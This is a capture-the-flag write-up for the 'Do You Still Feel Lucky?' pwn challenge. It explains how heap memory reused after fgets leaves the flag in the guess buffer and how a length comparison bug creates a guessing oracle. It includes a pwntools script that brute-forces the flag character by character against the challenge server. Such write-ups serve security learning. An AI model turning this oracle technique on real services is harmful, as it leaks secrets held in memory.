# Do You Still Feel Lucky? -- Solution

The user is given a seemingly impossible task of guessing the flag with useful
feedback given when more than half the flag characters are guessed and again
when all but two characters are guessed.

```c  
void read_flag() {  
 FILE* in;  
  
 in = fopen("flag.txt", "rt");  
 fgets(flag, 64, in);  
 flag_length = strlen(flag);  
 fclose(in);  
}

void guess_flag() {  
 int guess_length;  
 char *guess;  
 int ncorrect;  
 int i;  
  
 puts("Try to guess the flag!");  
 puts("Enter the length of your guess:");  
 scanf("%d", &guess_length);  
 getchar();  
 guess = malloc(guess_length);  
 puts("Enter your guess:");  
 fgets(guess, guess_length, stdin);

 ncorrect = 0;  
 for (i=0; i<guess_length && i<flag_length; i++)  
   if (guess[i] == flag[i])  
     ncorrect++;

 if (ncorrect == flag_length)  
   puts("Got it!");  
 else if (ncorrect == flag_length-2)  
   puts("Almost!");  
 else if (ncorrect*2 >= flag_length)  
   puts("Getting there!");  
 else  
   puts("Not even close.");  
  
 free(guess);  
}  
```

Exploit is possible due to a bug in how the guess is read and compared to the
flag, but also a bit of luck with the allocator:

1. With the provided libc, `fgets` will allocate (and subsequently free) heap memory to store the data read from the file -- the flag in our case. Later, when `malloc` is used to allocate memory for the guess, it will return the same heap address used by `fgets` that will *already contain the flag*.

2. If the user sends a string shorted than `guess_length`, the string is zero-terminated, but all the `guess_length` number of characters will be compared to the flag. Hence, as long as the user sends some *prefix* of the flag, the number of calculated number of correct characters will be `n-2` (all except newline and zero characters). 

Therefore, we can search the flag characters one by one always maintaining a
correct prefix.

```python  
#!/usr/bin/env python3

import string

from pwn import *

def conn():  
   context.update(arch='amd64', os='linux', terminal=['tmux', 'new-window'])  
   if args.REMOTE:  
       p = remote( '0.cloud.chals.io', 25330)  
   else:  
       p = process('./chall')  
   return p

def guess(k, s):  
   p = conn()  
   p.sendlineafter(b':\n', str(k).encode())  
   p.sendlineafter(b':\n', s.encode())  
   ret = p.recvline()  
   p.close()  
   return ret.strip().decode('ascii')  
  
C = 'TBTL'  
for i in range(60):  
   next = None  
   for x in string.printable:  
       g = guess(64, C+x)  
       print(C+x, g)  
       if g == 'Got it!':  
           print(C+x)  
           exit()  
       elif g[0] == 'A':  
           next = x  
           break   
   assert next  
   C += x  
```

Original writeup (https://github.com/blockhousetech/TBTL-
CTF/tree/master/2023/Pwn/do_you_still_feel_lucky/solution).